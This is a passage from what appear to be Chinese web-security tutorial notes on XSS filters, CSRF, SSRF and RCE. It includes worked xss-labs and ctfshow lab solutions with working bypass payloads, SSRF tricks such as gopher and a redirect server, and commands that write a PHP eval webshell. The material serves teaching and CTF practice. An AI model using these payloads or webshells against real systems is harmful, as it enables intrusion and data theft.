&#x27;xiaodi&#x27;);  setcookie(&#x27;pass&#x27;, &#x27;123456&#x27;);  ?&gt;  // 加载的是一张我随意百度的外部图片  &lt;img src=&quot;https://img1.baidu.com/it/u=1838809789,205932933&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=889&amp;h=500&quot;/&gt;\n\n\n这里设置了两个 cookie，并且注释掉了 csp 的声明\n\n\n接下来我们去访问这个文件\n\n\n\n可以看到这里正常的加载了图片\n\n\n那么我们现在把注释取消，再来试一下\n\n\n\ncsp 的意思就是说只允许加载同源的图片，所以说外面的图片加载不了，但可以加载同一个网站的图片，这样的设置，也就避免了，xss 平台获取信息的方法，虽然反射型的 xss 仍然是有效的，但这种通常没什么危害，也没有什么意义\n\n\n绕过及判断\n\n\n本来 xss 就不好利用造成危害，更别提开这个了，遇到直接跑路\n\n\n因为 CSP 的 本质是在 HTTP 响应头中添加 Content-Security-Policy 字段，所以我们可以通过这个命令查看 Header 是否有这个字段即可：\n1&gt; curl -i http://IP:Port/file\n\n\n比如这里\n\n\n\n2.HttpOnly\n原理\n\n\nHttpOnly 是 Cookie 的一个安全属性，由服务器通过 Set-Cookie 响应头设置，用于限制客户端脚本（如 JavaScript）对 Cookie 的访问。他的核心目的是防御 XSS 攻击对敏感 Cookie 的窃取。\n\n\n开启这个选项很简单，只需要使用如下代码即可：\n12// cookie名，cookie值，cookie失效时间，cookie有效路径，cookie有效域名，secure安全属性，httponly安全属性setcookie(&#x27;name&#x27;, &#x27;xiaodi&#x27;, time() + 3600, &#x27;/xss&#x27;, &#x27;&#x27;, false, true);\n\n\n绕过和判断\n\n也没有啥绕过的必要，都很鸡肋\n这个可以直接在网页上 F12 看应用程序里的 cookie，如果开启的话会打上对钩\n\n九、XSS Filter 及靶场演示\n原理\n\nXSS Filter（跨站脚本过滤器）是一种用于 检测并拦截恶意 XSS 代码 的安全机制，主要用于防御跨站脚本攻击（XSS）。\n一般有三种方式：\n\n基于特征检测：使用 正则表达式 匹配关键词，比如检测恶意标签、函数或事件等等，就相当于黑名单过滤\n基于异常检测：更高级的 Fliter 会基于用户输入的内容进行检测，如果出现异常行为就进行拦截\n输出编码：这个就是一个 间接的防御方式，通过将输入的编码进行实体化，将输出的内容进行编码等等\n\n\n其实就是类似于防火墙对流量的检测方式。\n\n靶场演示\n\n这里就简单演示几个\n\n第二关\n\n\n\n发现有回显，尝试插入 js 语句\n\n\n\n并没有成功，这里的回显没有出现符号丢失的问题，大概率是被实体化了，这里 f12 查看一下（通常要编辑下 HTML）\n\n\n\n确实被实体化了，那这个点就基本绕不过了，只能换一个地方了，我们看到下面这里输入框还有个点，编辑成 HTML 之后可以看到没有被实体化：\n\n\n\n那我们就可以从这里入手，因为它是在 value 属性里的，所以被解析成了字符串，我们可以像 SQL 注入那样去尝试闭合，这里虽然显示双引号，但是我们单双引号都要尝试（因为前端只显示双引号），于是我们尝试去闭合\n\n\n\n成功弹窗\n\n\n第三关\n\n\n\n使用 JS 注入语句 &lt;script&gt;alert(1);&lt;/script&gt; 看看能不能弹窗，这里和上一关一样，能够正常显示，但是并不弹窗，所以是被实体化了，而且这里两个点都被实体化了，尝试输入单双引号闭合，发现都不行，但我们 除了标签能够利用之外，还有事件可以利用\n\n\n常见的标签事件：XSS 常用标签及触发事件 - 简书\n\n\n\n这里 &lt;input&gt; 标签是有一个 onfocus、click 等事件可以利用的，那我们就直接构造一个事件出来，先使用单引号闭合，然后后面插入 ' onfocus='alert(1);'\n\n\n成功弹窗\n\n\n这里是成功利用了，这里为什么单引号不会被实体化呢？这是 htmlspecialchars() 函数的特性，转义哪些字符是根据其 flag 参数所定的，而默认呢是不实体化单引号的，在这里我们看源码他刚好是通过单引号包裹的，所以才能够侥幸绕过\n12// 源代码&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;\n\n\n第五关\n\n\n\n仍然首先尝试闭合后注入普通 JS 语句，这里没有弹窗：\n\n\n\n这里可以看到首先是成功闭合了，说明是双引号，并且没有实体化，但是这里有点看不懂，我们再尝试用单引号闭合看看他的过滤方式\n\n\n\n这里就可以很明显的看到他将 script 转成了 scr_ipt，让标签失效了，那我们可以先尝试 大小写绕过，这里是不行的，还是显示上面的结果，说明他在处理前转过小写\n\n\n那我们就先看看事件能不能用，先单引号闭合看看 ' onfocus='alert(1);'：\n\n\n\n这里 on 也被转换了，换一个属性试试呢，不行，这里 &lt;input&gt; 标签可用属性中都含有 on\n\n\n再换种思路，这里既然能够闭合，那我们使用其他标签可不可以呢？看了看刚刚的那篇文章，发现有两个标签满足条件 &lt;a&gt; 和 &lt;iframe&gt;：\n12345payload1：&quot;&gt;&lt;a href=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;payload2：&quot;&gt;&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;\n\n\n之后的参考文章：xss-labs 靶场实战全通关详细过程（xss 靶场详解）-CSDN 博客\n\n\n十、黑盒 XSS 手工分析\n\n页面中显示的数据找可控的（有些隐藏的）\n利用可控地方发送 JS 代码去看执行加载情况\n成功执行即 XSS，不能成功执行就 F12 看语句输出的地方显示情况（过滤）\n根据显示分析为什么不能执行，尝试绕过（实体化、闭合、关键词过滤等）\n\nCSRF 跨站请求伪造\n一、基础知识\n\n\nCSRF（Cross-Site Request Forgery），也叫跨站请求伪造，是一种网络攻击手段，攻击者通过诱导用户在 已认证的状态下 访问恶意链接或页面，迫使用户的浏览器向目标服务器发送非预期的请求，从而执行攻击者预设的操作（如转账、修改密码、发表评论等）。\n\n\n\n其实很好理解，就像上面那张图一样，假设我现在抓到了支付宝的转账数据包如下：\n1http://www.alipay.com/pay.php?name=ling&amp;account=12732834&amp;money=10000\n\n\n然后我们搭建一个网站，让这个网站去直接加载这个数据包自动跳转，最后把这个网站的网址发给受害者\n\n\n如果这时受害者正处于支付宝的登录的状态下，那么他就会自动进行这个转账\n\n\n这就是典型的 CSRF 攻击\n\n\n利用条件\n\n从上面可以看到，CSRF 的利用条件呢有三点：\n\n需要请求伪造的数据包（可以通过 cms 之类的自己搭建并抓包想要利用别人的权限进行的操作）\n网站没有过滤防护或者有防护但可以绕过\n受害者要已经成功登录状态或者打开网站，而且要点击我们的恶意网站\n\n\n\n二、无检测实战利用\n利用\n\n无检测防护就是说 开发者默认信任用户的所有操作，因此没有加一些 Token、二次验证、来源检测等等\n那这时候我们就可以通过 BP 去生成 CSRF 的 POC，将文件放到自己的网站下面，诱使受害者去点击访问\n当然更多是 配合 XSS 去打组合拳\n\n实战案例\n\n\n这里我们以 CMS 为例\n\n\n\n这里是一个管理员后台，正在进行添加新的管理员的操作，我们点击保存并进行 BP 抓包\n\n\n\n抓到包之后，我们右击选中 Engagement tools -&gt; Generate CSRF PoC：\n\n\n\n进入到下一步操作\n\n\n\n点击右上角的 Options，勾选第一个和最后的选项，如图所示：\n\n\n\n最后点击 Regenerate，就可以生成一个用于 CSRF 攻击 的恶意网站了，然后我们点击 Copy HTML，将他保存为一个 html 页面，放到自己的服务器上，这里就用虚拟机代替了，开启简单的服务器，恶意网址为 http://192.168.0.129:8881/index.html\n\n\n\n然后我们假装自己就是受害者，点击这个网址\n\n\n\n显示成功，我们再回到刚才的那个添加管理员的页面，发现成功添加上去了\n\n\n三、Referer 和 Origin 检测\n原理\n\nReferer 和 Origin 都是 HTTP 请求头的一个字段，用于记录当前请求的 来源页面 URL（即 “从哪个页面跳转到当前请求”）\nReferer &amp; Origin 同源策略 是指：服务器通过检查请求头中的 Referer / Origin 字段，验证请求是否来自 可信的同源域名，以此判断请求是否合法\nReferer 和 Origin 的区别：\n\nOrigin 仅包含 ”协议 + 域名 + 端口“，相比于 Referer 来说更加简洁\nReferer 包含完整的 URL 来源，包括 协议、域名、端口、路径、参数 等\n\n\n\n12345678910GET /index.html HTTP/1.1Host: 192.168.0.129:8881Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0Origin: http://192.168.0.129:8881Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://192.168.0.129:8881/index.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: close\n实战案例\n\n\n这里演示的是 zblog 和 Referer 的验证\n\n\n我们还是先进行我们之前的操作，首先先添加账户并抓到那个数据包\n\n\n\n\n还是和之前一样的操作，我们利用 bp 上面的功能生成一个 CSRF 伪造的 add.html，放到我们的恶意网站上\n\n\n然后我们假装成受害者进行访问，却发现失败了\n\n\n\n我们抓下这个恶意网站的数据包，查看一下\n\n\n\n可以看到它的 Referer 是 http://192.168.0.129:8881/，然后提示我们非法访问，说明这里就进行了拦截，那他是怎么一个拦截逻辑呢？我们可以看看源代码进行分析\n\n\n首先我们捕获到的数据包中提交的地址是 /zb_system/cmd.php，传入的参数为 act=MemberPst，那我们就直接找到这个文件，搜索一下这个参数\n\n\n\n这里就找到了，我们看到这里有一个 CheckIsReferValid() 函数，很明显就是检查 Referer 的东西，然后我们追踪看一下：\n\n\n\n这里他先检查 CSRFToken，先不管，先看下面的这个 CheckHTTPRefererValid() 函数，继续追踪：\n\n\n\n可以看到它会检查 HTTP_REFERER 这个属性，这个东西其实就是 $_SERVER 中的一个属性，如果它为空，那就返回 True；如果它不是当前博客的网址，就返回 false，这里最骚的是使用的 stripos() 函数去比较，也就是说只要里面包含博客的地址，都返回 true\n\n\n那么我们通过这个代码可知，现在有两种绕过方法\n\nReferer 头包含受害者的博客地址\nReferer 头为空\n\n\n\n我们首先尝试一下头为空的情况，在生成的代码中添加这段代码\n1234&lt;head&gt;    &lt;!-- 添加Referrer Policy，禁止发送Referer头 --&gt;\t&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/head&gt;\n\n\n然后我们再次尝试 CSRF 攻击，并且抓个包看看它是否还有 Referer 头\n\n\n\n这时候可以看到，已经没有 Referer 头已经没有了\n\n\n\n同样，我们演示一下第二种绕过方式，这里将 add.html 还原，把用户删掉，然后再次访问恶意链接抓包\n\n\n\n将原来的改成受害者的地址\n\n\n最后也是成功添加\n\n\n绕过方式\n\n如果开启了 Referer 头的验证，我们可以从三方面去考虑\n\nReferer 改成网站的域名：但是这个必须要改数据包才行，总不能让受害者改吧，当然还有一种思路就是看能不能把这个文件名改成 http://[域名]:[端口] 的格式，这样加载的时候就会带上这个文件名，但是文件名不能带//，所以这个也不行\nReferer 头置空：就是带有这个头，但是没有内容，不过这也得受害者改包\n删除 Referer 头：这个可以实现，像上面演示的一样，但能不能绕过还是得看网站的代码怎么写的\n\n\n一般对 Referer 头的检测就三种逻辑\n\n全部对比：一一对应，严谨对比 =&gt; 配合 xss 或者上传（触发数据包保证是同一来源）\n匹配对比：只要包含某个域名即可 =&gt; 直接访问\n逻辑判断隐患：置空或删除\n\n\n\n四、Token 校验\n原理\n\nToken 校验是一种通过 随机生成的字符串（Token） 验证请求合法性的安全机制。Token 作为客户端与服务器之间的 “秘密凭证”，用于证明请求是 “经授权的合法来源” 发起的，而非攻击者伪造\n其实就是 服务器 每次都生成一个 一次性的凭证 给用户，用户每次操作之前都需要拿着这个凭证给服务器 证明自己的身份，使用之后该 Token 就 失效 了，下一次操作又需要新的 Token\n\n绕过方式\n\n遇到 Token 也不是完全没有办法，如果开发者代码逻辑写的有问题，那么我们还是有机会绕过的\n最常见的就是三种情况：\n\n复用：就是如果代码没有规定这个 Token 的失效时间，那它就可以重复使用\n置空：可以尝试将 Token 的值置空去尝试能不能绕过验证\n删除：也可以尝试将 Token 删除看看能不能绕过\n\n\n\nSSRF 服务端请求伪造\n一、基础知识\n原理\n\n\nSSRF（Server-Side Request Forgery），也叫服务器端请求伪造，是一种由攻击者 诱导服务器发起非预期网络请求 的漏洞，其核心危害在于 “滥用服务器的网络权限” 突破外网限制，攻击内网服务、本地资源或第三方系统。\n\n\n它的本质就是 服务器在处理用户输入的 “网络请求目标” 时，未严格验证或过滤目标地址，导致攻击者可控制服务器向任意地址（内网、本地、第三方）发起请求。\n\n\n其实也是特别简单，就是下面这个简易的图就可以表示：\n12345671. 公网服务器A  -----&gt;  内网服务器B    (A能访问B)2. 攻击者  --/--&gt;   内网服务器B      (攻击者不能访问B)3. 攻击者  -----&gt;   公网服务器A   -----&gt;  内网服务器B  (攻击者能通过A访问B)\t↓                                       ↑\t----------------—间接访问-----------------\n\n\n\n\nSSRF 的利用方式\n\n对于 SSRF，有如下典型的利用方式：\n\n内网资源探测与拓扑测绘\n\n探测存活主机\n探测开放端口与服务\n\n\n攻击内网 / 本地敏感服务\n\n攻击内网 Web 服务\n攻击数据库/中间件\n攻击本地系统服务器\n\n\n协议攻击\n\nhttp://、https:// 协议访问内网资源\nfile:// 协议任意文件读取\nftp://、sftp://、tftp:// 协议访问 FTP 服务\ndict:// 协议探测服务版本\ngopher:// 协议构造 TCP 请求，攻击 Redis、MySQL 数据库等\nladp:// 轻量级目录访问协议\n\n\n绕过网络访问控制\n\n绕过防火墙、ACL 等\n\n\n\n\n\nSSRF 的利用条件\n\nSSRF 成功利用的条件\n\n服务器 存在网络请求的功能点，并且这个 请求地址用户可控 =&gt; 有无注入点\n服务器对请求目标 缺乏有效验证/过滤 =&gt; 能否绕过\n服务器 具备 访问目标资源的 网络权限 =&gt; 有无访问权限\n攻击者 能够获得请求的结果 =&gt; 有回显/无回显\n目标资源 存在可利用的弱点 =&gt; 能否产生危害\n\n\n\n黑白盒测试\n\n\n业务功能点：\n\n社交分享功能：获取超链接的标题等内容进行显示\n转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览\n在线翻译：给网址翻译对应网页的内容\n图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片\n图片/文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验\n云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试\n网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作\n数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数\n邮件系统：比如接收邮件服务器地址\n编码处理, 属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等\n未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞\n\n\n\nURL 关键字：\n12345678910111213sharewapdispalyurllinksourceURLsrctargetusourceimageURLdomainredirechtURL\n\n\n白盒分析：代码审计（文件读取、加载、数据操作类的函数）\n\n\n二、实战案例\n无防护的 SSRF\n原理\n\n就是服务器对于外部请求的链接没有过滤、也没有任何检测和防护，导致可以直接利用\n\n实战案例\n\n\n这里需要两台服务器做演示，一台服务器 A 用来做内网穿透，本机作为内网，另一台服务器 B 作为攻击者\n\n\n现在我们在服务器 B 上访问服务器 A 内网穿透的网站长这样：\n\n\n\n这里我们就加载一个正常的图片，比如 http://www.xiaodi8.com/zb_users/upload/2019/12/201912151576406028214564.jpg，提交\n\n\n\n可以看到它解析了，现在我们本机的地址是 192.168.0.100（这里是方便演示，所以用实际的内网 IP 地址，利用的时候用 127.0.0.1 即可），我们通过浏览器直接访问它看一看：\n\n\n\n能看到这里通过浏览器直接访问是看不到任何内容的，但是当我们通过刚刚的网站去访问这个地址的时候，神奇的事情就发生了：\n\n\n\n这里就加载出了我本地搭建在 80 端口的网站，同样访问其他端口也是一样的，比如我们这里访问看看 3306 端口（这里要换成 127.0.0.1 才能连接上，但道理都是一样的，需要内网地址才能看到效果）：\n\n\n\n比如我们这里就可以进行一些简单的利用：任意文件读取、内网探测等等\n\n\n\n\n有防护的 SSRF\n原理\n\n有防护的 SSRF，一般防护的方式有几种：\n\n白名单校验：仅允许服务器请求预定义的可信目标\n黑名单过滤：拦截敏感地址，比如内网地址、特殊地址、危险协议等\nURL 解析规范化：避免因 URL 格式混乱导致的验证绕过，比如 URL 中不能带@、#，不能包含多个\\、//等\n限制请求端口：仅允许服务器访问常见的端口\n基于异常防护：禁止加载跳转页面、禁止加载域名解析为内网地址的网站等\n\n\n\n绕过方式\n\n如果 限制为 http://www.xxx.com 域名的形式，采用 http 基于身份认证的方式绕过，即 http://www.xxx.com@www.yyy.com，他会去解析 @ 符号后面的域名\n限制请求 IP 不为内网地址：\n\n采用 短网址 绕过\n采用 域名解析内网地址 绕过\n采用 进制转换 绕过\n采用 3xx 重定向 到内网地址绕过\n\n\n\nctfshow 题目演示\nWeb351\n\n\n源码如下\n1234567891011&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $ch=curl_init($url);  curl_setopt($ch, CURLOPT_HEADER, 0);  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  $result=curl_exec($ch);  curl_close($ch);  echo ($result);  ?&gt;\n\n\n代码很简单，POST 传入一个 url 值，然后进行执行显示结果\n\n\n这里就直接给出 payload 为 url=http://127.0.0.1/flag.php，post 传参，让他尝试显示本地 flag.php 文件：\n\n\n\n成功拿到 flag\n\n\n当然如果知道它的完整路径也可以通过 file:// 伪协议读取，常见的默认路径为 /var/www/html/flag.php\n\n\nWeb352\n\n\n源码如下\n12345678910111213141516171819202122&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $x=parse_url($url);  if($x[&#x27;scheme&#x27;]**=&#x27;http&#x27;||$x[&#x27;scheme&#x27;]**=&#x27;https&#x27;)&#123;  \tif(!preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;  \t\t$ch=curl_init($url);  \t\tcurl_setopt($ch, CURLOPT_HEADER, 0);  \t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  \t\t$result=curl_exec($ch);  \t\tcurl_close($ch);  \t\techo ($result);  \t&#125;  \telse&#123;  \t    die(&#x27;hacker&#x27;);  \t&#125;  &#125;  else&#123;      die(&#x27;hacker&#x27;);  &#125;  ?&gt;\n\n\n看看代码，POST 传入 url，第一个 if 判断要求这个 url 的头部必须是 http 或者 https 协议\n\n\n第二个 if 判断要求 url 参数中不能包含 localhost 和 127.0.0 字段\n\n\n那这里我们就可以用进制转换进行绕过\n\n\n这里写下 127.0.0.1 的各个进制转换的结果\n1232130706433   十进制017700000001 八进制0x7F000001   十六进制\n\n\n\nWeb353\n\n\n源码如下\n12345678910111213141516171819202122&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $x=parse_url($url);  if($x[&#x27;scheme&#x27;]**=&#x27;http&#x27;||$x[&#x27;scheme&#x27;]**=&#x27;https&#x27;)&#123;  \tif(!preg_match(&#x27;/localhost|127\\.0\\.|\\。/i&#x27;, $url))&#123;  \t\t$ch=curl_init($url);  \t\tcurl_setopt($ch, CURLOPT_HEADER, 0);  \t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  \t\t$result=curl_exec($ch);  \t\tcurl_close($ch);  \t\techo ($result);  \t&#125;  \telse&#123;  \t    die(&#x27;hacker&#x27;);  \t&#125;  &#125;  else&#123;      die(&#x27;hacker&#x27;);  &#125;  ?&gt;\n\n\n这里和之前一样，先判断是否是 http 或者 https 协议\n\n\n然后再正则匹配，不能包含 localhost、127.0.、。 字段，并且转为小写匹配\n\n\n那我们继续用十进制来进行绕过\n\n\n进制转换网站：IP 地址转换器_IP 地址转二进制、十进制、十六进制工具 - 站长工具网\n\n\n\nWeb354\n\n\n源码如下\n12345678910111213141516171819202122&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $x=parse_url($url);  if($x[&#x27;scheme&#x27;]**=&#x27;http&#x27;||$x[&#x27;scheme&#x27;]**=&#x27;https&#x27;)&#123;  \tif(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;  \t\t$ch=curl_init($url);  \t\tcurl_setopt($ch, CURLOPT_HEADER, 0);  \t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  \t\t$result=curl_exec($ch);  \t\tcurl_close($ch);  \t\techo ($result);  \t&#125;  \telse&#123;  \t    die(&#x27;hacker&#x27;);  \t&#125;  &#125;  else&#123;      die(&#x27;hacker&#x27;);  &#125;  ?&gt;\n\n\n同样，先要包含 http 或 https 的头，然后过滤掉了 localhost、0、1、。 字段\n\n\n这里我们就不能使用进制转换来进行绕过，但是我们可以使用短网址来进行绕过\n\n\n将 http://127.0.0.1 解析为一个域名即可绕过，可以在网上找短网址生成但记住不要有 0 和 1，也可以选择在阿里云自己整一个\n\n\n\n这里不知道为什么解析失败了，我们自己重新整一个\n\n\n\n最后成功绕过\n\n\nWeb355\n\n\n源码如下\n1234567891011121314151617181920212223&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $x=parse_url($url);  if($x[&#x27;scheme&#x27;]**=&#x27;http&#x27;||$x[&#x27;scheme&#x27;]**=&#x27;https&#x27;)&#123;  \t$host=$x[&#x27;host&#x27;];  \tif((strlen($host)&lt;=5))&#123;  \t\t$ch=curl_init($url);  \t\tcurl_setopt($ch, CURLOPT_HEADER, 0);  \t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  \t\t$result=curl_exec($ch);  \t\tcurl_close($ch);  \t\techo ($result);  \t&#125;  \telse&#123;  \t    die(&#x27;hacker&#x27;);  \t&#125;  &#125;  else&#123;      die(&#x27;hacker&#x27;);  &#125;  ?&gt;\n\n\n题目要求 host 的长度小于 5，那我们之前的短网址也不行了\n\n\n我们可以通过他的解析规则策略来进行绕过，比如可以通过 127.1、0，或者 [::] 进行解析，可以自己 ping 下，这样的写法是可以解析成 127.0.0.1\n\n\n这里我们选择 127.1 来进行绕过\n\n\n\nWeb356\n\n\n源码如下：\n1234567891011121314151617181920212223&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $x=parse_url($url);  if($x[&#x27;scheme&#x27;]**=&#x27;http&#x27;||$x[&#x27;scheme&#x27;]**=&#x27;https&#x27;)&#123;  \t$host=$x[&#x27;host&#x27;];  \tif((strlen($host)&lt;=3))&#123;  \t\t$ch=curl_init($url);  \t\tcurl_setopt($ch, CURLOPT_HEADER, 0);  \t\tcurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  \t\t$result=curl_exec($ch);  \t\tcurl_close($ch);  \t\techo ($result);  \t&#125;  \telse&#123;  \t    die(&#x27;hacker&#x27;);  \t&#125;  &#125;  else&#123;      die(&#x27;hacker&#x27;);  &#125;  ?&gt;\n\n\n同样，开头是 http 或 https，然后这里比上一关限制得更严格，长度必须小于 3\n\n\n那我们这里选择 0 来进行绕过\n\n\nWeb357\n\n\n源码如下\n1234567891011121314151617&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $x=parse_url($url);  if($x[&#x27;scheme&#x27;]**=&#x27;http&#x27;||$x[&#x27;scheme&#x27;]**=&#x27;https&#x27;)&#123;  \t$ip = gethostbyname($x[&#x27;host&#x27;]);  \techo &#x27;&lt;/br&gt;&#x27;.$ip.&#x27;&lt;/br&gt;&#x27;;  \tif(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;  \t    die(&#x27;ip!&#x27;);  \t&#125;  \techo file_get_contents($_POST[&#x27;url&#x27;]);  \t&#125;  else&#123;      die(&#x27;scheme&#x27;);  &#125;  ?&gt;\n\n\n首先还是开头是 http 或者 https，然后它这里使用了一个 gethostbyname() 的函数，这个函数的作用就是去解析域名然后得到 ip 地址，然后再将这个 ip 地址进行一个过滤\n\n\n过滤规则我们不清楚，但是可以猜到他过滤了一些特殊 ip，那我们就没办法在用直接解析成 127.0.0.1 的写法了\n\n\n由于他是只过滤了一次，我们可以使用重定向让他第一次解析到的 ip 是合法的，但这个网站会跳转到 127.0.0.1\n\n\n我们在自己的服务器搭建这样一个网站内容是\n12&lt;?phpheader(&quot;Location:http://127.0.0.1/flag.php&quot;);\n\n\n然后我们访问我们的服务器，成功得到 flag：\n\n\nWeb358\n\n\n源码如下\n12345678&lt;?php  error_reporting(0);  highlight_file(__FILE__);  $url=$_POST[&#x27;url&#x27;];  $x=parse_url($url);  if(preg_match(&#x27;/^http:\\/\\/ctf\\..*show$/i&#x27;,$url))&#123;      echo file_get_contents($url);  &#125;\n\n\n这里判定需要我们输入的 url 起始位置（^）必须是 http://，然后 host 位置必须以 ctf. 开始，中间是 .* 是通配符，表示匹配任意字符，最后必须以 show 结尾（$）\n\n\n翻译一下就是我们的 payload 必须是 http://ctf.(xxxx)show 的形式\n\n\n那么这里我们应该怎么绕过呢？我们可以利用之前提到的，通过一些特定的字符，让 URL 解析混乱\n\n\n比如在 URL 中 @ 字符表示前面是用户信息，后面才是实际的解析主机地址；# 后面的信息表示片段名，这个在 DOM-XSS 那节见过\n\n\n那我们就可以写出如下 payload 来绕过 url=http://ctf.@127.0.0.1/flag.php#show\n\n\nWeb359-360\n\n\n\n这个题没有源码，它是一个登录的网页，那我们抓一下包：\n\n\n\n发现它的参数是 returl，值是一个网址，那这里可能就是我们的 SSRF 注入点\n\n\n这里的话它提示了去攻击无密码的数据库，那就说明要通过这个注入点去连数据库\n\n\n因为我们通过 http 或者 https 协议是没办法访问数据库的，所以只能通过其他协议，那 gopher:// 协议就是做这种事情的，我们可以通过该协议去与数据库通信\n\n\n这里可以使用一个工具 gopherus 去帮我们生成利用的 payload：\n\n\n\n这里就不用纠结怎么知道路径啊，这些问题了，就理解体会一下这个协议的用法就可以了\n\n\n因为实战中一般遇不到没有密码的数据库，Redis 还有可能存在匿名登录\n\n\n由于我们的 payload 会被网站进行一次解码，所以这里我们要进行一次 URL 编码，保证 payload 的作用\n\n\n\n然后访问 x.php，正常的命令执行就行，这里我们直接 POST 传入参数 x=system('cat /flag.txt') 得到 flag：\n\n\n\n无回显的 SSRF\n如何利用\n\n前面讲的都是有回显的 SSRF，但是有些时候 SSRF 利用是没有回显的\n那这时候应该怎么办呢？我们应对无回显的东西，无论是 RCE 还是 SQL 注入，亦或者是今天的 SSRF，都有下面几种思路：\n\nDnsLog 尝试带外\n正向连接：尝试让对方开启 nc 之类的东西，然后我们去连接\n反向连接：本地开个 nc 或者服务器，让对方来连接/访问\n如果能上传文件，可以创建个文件然后看能否访问\n\n\n比如一些在线编辑 PDF、Word、Excel 的网站，有些它是会解析里面的内容的，但是它不会回显\n\nRCE 命令执行漏洞\n一、基础知识\n原理\n\nRCE（Remote Code Execution，远程代码执行）是指攻击者通过漏洞在目标服务器或应用程序上执行 任意代码或系统命令 的漏洞类型。其核心原理是 应用程序对用户输入的处理存在安全缺陷，导致攻击者可控的输入被当作代码或命令执行。\n而根据使用的 函数不同，RCE 又可以分为命令注入和代码注入\n\n命令注入\n\n\n代码使用 可以调用系统命令的函数，并且传入的参数可控，造成任意命令执行\n\n\nPHP 中的命令执行函数 有：\n\n\n直接回显：system()、passthru()、ob_start()+shell_exec()+ob_get_clean() 联合使用\n\n\n\n不直接回显：exec()、shell_exec()、popen()、proc_open()、proc_get_status()、pcntl_exec()、posix_spawn()\n\n\n\n\n\nJava 中的命令执行类/方法（都不直接回显）有：\n\n\n常见：Runtime.getRuntime.exec()、ProcessBuilder.start()、Process.getInputStream()、Process.getErrorStream()\n\n\n\n不常见：ScriptEngine.eval()、JNI调用、ProcessImpl.start()、反射利用\n\n\n\n\n\nPython 中的命令执行函数 有：\n\n\n直接回显：os.system()、subprocess.call()、subprocess.run()、pty.spawn()\n\n\n\n不直接回显：os.popen().read()、subprocess.check_output()、commands.getoutput()、eval()、exec()\n\n\n\n\n\n代码执行\n\n\n代码使用 可以执行当前编程语言代码的函数，并且传入参数可控，造成任意代码执行\n\n\nPHP 中的代码执行函数 有：\n\n\n直接回显：eval()、assert()、create_function()、array_map()\n\n\n\n不直接回显：preg_replace()、call_user_func()、call_user_func_arry()、ReflectionFunction-&gt;invoke()、eval()、array_filter()、uasort()\n\n\n\n\n\nJava 中的代码执行类/方法（都不直接回显）有：\n\n\n常见方法：ScriptEngine.eval()、Class.forName().newInstance()、Method.invoke()、ClassLoader.defineClass() + newInstance()\n\n\n\n不常见方法：JavaCompiler.compile()、GroovyShell.evaluate()、JRubyEngine.eval()、TemplatesImpl.newTransformer()\n\n\n\n\n\nPython 中的代码执行函数 有：\n\n\n直接回显：exec()、eval()、compile() + evec()\n\n\n\n不直接回显：eval()、exec()、__import__('builtins').exec()、types.FunctionType()、pickle.loads()\n\n\n\n\n\n相互转换\n\n\n一般来说，代码执行和命令执行是可以转换使用的\n\n\n遇到代码执行漏洞时，可以通过代码 调用命令执行函数实现命令执行，比如 eval(system('ls'););\n\n\n但是遇到命令执行漏洞时，可以 将代码写入文件当中，然后让系统去 执行文件，比如写入 webshell\n12345# Linux(bash)echo &#x27;&lt;?php @eval($_POST[x]);?&gt;&#x27; &gt; /var/www/html/shell.php# Windows(cmd)echo ^&lt;?php @eval($_POST[x]);?^&gt; &gt; D:\\xampp\\htdocs\\shell.php\n\n\n或者直接包含一句话木马的语法，然后使用工具去尝试连接：\n1连接地址：http://xxx/xx.php?code=eval($_POST[x]);\n\n\n利用方法\n\n代码执行：\n\n脚本：java、php、python\n产生：Web 源码、中间件平台、其他环境\n检测：白盒 --&gt; 代码审计\n检测：黑盒 --&gt; 